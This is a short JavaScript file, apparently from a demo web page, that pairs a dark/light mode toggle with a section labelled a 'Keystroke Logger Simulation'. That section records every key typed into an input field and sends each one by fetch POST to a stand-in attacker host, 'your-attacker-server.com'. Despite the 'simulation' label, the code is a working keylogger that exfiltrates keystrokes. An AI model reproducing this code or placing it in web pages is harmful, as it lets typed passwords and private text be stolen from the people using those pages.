// Toggle Dark/Light Mode
const toggleModeButton = document.getElementById('toggleMode');
toggleModeButton.addEventListener('click', () => {
    document.body.classList.toggle('dark-mode');
    document.body.classList.toggle('light-mode');
    toggleModeButton.textContent = 
        document.body.classList.contains('dark-mode') ? 'Light Mode' : 'Dark Mode';
});

// Keystroke Logger Simulation
const inputField = document.getElementById('inputField');
const keyLogs = document.getElementById('keyLogs');
let logs = [];

inputField.addEventListener('keydown', (event) => {
    logs.push(event.key);
    keyLogs.textContent = logs.join(' ');

    // Example: Simulate sending data to a remote server
    fetch('https://your-attacker-server.com/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key: event.key }),
    }).catch((err) => console.error('Error logging key:', err));
});
